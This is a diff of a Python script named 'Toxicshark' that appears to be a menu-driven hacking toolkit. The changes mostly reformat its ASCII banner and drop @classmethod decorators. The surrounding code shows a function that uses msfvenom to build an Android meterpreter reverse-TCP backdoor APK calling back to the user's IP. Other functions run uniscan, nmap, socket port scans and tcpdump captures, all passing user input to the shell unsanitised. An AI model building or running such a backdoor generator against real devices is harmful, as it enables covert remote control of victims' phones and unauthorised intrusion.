@@ -4,37 +4,38 @@ import time
 import colorama
 from colorama import Fore, Back, Style
 from socket import *
+                
 
 
 print(Fore.BLUE)
 print("""
 
-
-
-
-                  ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
-                  ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠛⣉⠉⠄⢀⣼⣿⣿
-                  ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠁⠄⠄⢀⣈⣤⣀⣸⣿⣿⣿
-                  ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠄⠄⠄⠄⠞⠋⠁⠄⠈⣿⣿⣿⣿
-                  ⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⠄⠄⠄⠄⠄⠄⠄⠄⠄⣴⣿⣿⣿⣿
-                  ⣿⣿⣿⣿⣿⣿⣿⣿⡏⠄⠄⠄⠄⠄⠄⠄⠄⣠⣾⣿⣿⣿⣿⣿
-                  ⣿⣿⣿⣿⣿⡿⠛⠉⠄⠄⠄⠄⠄⠄⠄⠄⠄⠙⢿⣿⣿⣿⣿⣿
-                  ⣿⣿⣿⣿⠋⠄⠄⠄⠄⠄⠄⠄⠄⠄⢀⣀⣀⣀⠄⠙⣿⣿⣿⣿
-                  ⣿⣿⣿⠃⢀⣴⣶⣿⡆⠄⠄⠄⠄⠄⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿
-                  ⣿⣿⣧⣾⣿⣿⣿⣿⣧⠄⠄⠄⠄⠄⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
-                  ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠄⠄⠄⠄⠈⠻⣿⣿⣿⠿⠛⣿⣿⣿
-                  ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣤⣀⠄⠄⠄⠈⠛⠁⠄⣰⣿⣿⣿
-                  ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣶⣦⣄⡀⠹⣿⣿⣿
-                  ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿          
+⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠛⣉⠉⠄⢀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠁⠄⠄⢀⣈⣤⣀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠄⠄⠄⠄⠞⠋⠁⠄⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⠄⠄⠄⠄⠄⠄⠄⠄⠄⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠄⠄⠄⠄⠄⠄⠄⠄⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠉⠄⠄⠄⠄⠄⠄⠄⠄⠄⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠋⠄⠄⠄⠄⠄⠄⠄⠄⠄⢀⣀⣀⣀⠄⠙⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⢀⣴⣶⣿⡆⠄⠄⠄⠄⠄⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⣾⣿⣿⣿⣿⣧⠄⠄⠄⠄⠄⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠄⠄⠄⠄⠈⠻⣿⣿⣿⠿⠛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣤⣀⠄⠄⠄⠈⠛⠁⠄⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣶⣦⣄⡀⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
 
 ████████╗░█████╗░██╗░░██╗██╗░█████╗░░██████╗██╗░░██╗░█████╗░██████╗░██╗░░██╗
 ╚══██╔══╝██╔══██╗╚██╗██╔╝██║██╔══██╗██╔════╝██║░░██║██╔══██╗██╔══██╗██║░██╔╝
 ░░░██║░░░██║░░██║░╚███╔╝░██║██║░░╚═╝╚█████╗░███████║███████║██████╔╝█████═╝░
-░░░██║░░░██║░░██║░██╔██╗░██║██║░░██╗░╚═══██╗██╔══██║██╔══██║██╔══██╗██╔═██╗░л
+░░░██║░░░██║░░██║░██╔██╗░██║██║░░██╗░╚═══██╗██╔══██║██╔══██║██╔══██╗██╔═██╗░
 ░░░██║░░░╚█████╔╝██╔╝╚██╗██║╚█████╔╝██████╔╝██║░░██║██║░░██║██║░░██║██║░╚██╗
 ░░░╚═╝░░░░╚════╝░╚═╝░░╚═╝╚═╝░╚════╝░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝           
                
                       Author: c0mrade
+
+
 
 """)
 
@@ -54,7 +55,6 @@ class Toxicshark:
     def __init__(self,choise):
        self.choise = choise
 
-    @classmethod
     def questions(self):
         print("Which you questions?")
         print("[1] -- How to listen connections(android backdoor)? ")
@@ -65,12 +65,12 @@ class Toxicshark:
         elif question == "2":
             print("[+] Download uniscan (sudo apt-get install uniscan) ")
 
-    @classmethod
+    
     def scan_site(self):
         url = input("Write url -->  ")
         subprocess.call(f"sudo uniscan -u {url} -qwed", shell=True)
 
-    @classmethod
+    
     def Create_backdoor_android(self):
         ip = input("Write your ip --> ")
         subprocess.call(f"msfvenom -p android/meterpreter/reverse_tcp LHOST={ip} LPORT=4444 R > hackingworld.apk", shell=True)
@@ -84,7 +84,7 @@ class Toxicshark:
         if any_question == "1":
             questions()
 
-    @classmethod
+    
     def nmap_scan(self):
         ip = input("[+] Write ip --> ")
         try:
@@ -93,7 +93,6 @@ class Toxicshark:
         except:
             print("Check you install nmap ? (sudo apt-get install nmap)")
 
-    @classmethod
     def python_scan(self):
         ports = []
         ip = input("[+] Write ip --> ")
@@ -107,7 +106,6 @@ class Toxicshark:
 
         print("[+] Finish ")
 
-    @classmethod
     def TCPdump(self):
         print("[+] Write a interface for analysis (default: wlan0) ")
         time.sleep(0.5)
@@ -126,6 +124,7 @@ class Toxicshark:
                 subprocess.call("sudo tcpdump -i wlan0 -X  -w udp.pcap --print", shell=True)
             except:
                 print("[-] Error check you install tcpdump?(sudo apt-get install tcpdump)")
+
     def libraries():
         try:
             subprocess.call(f"pip3 install -r ./requirements.txt", shell=True)
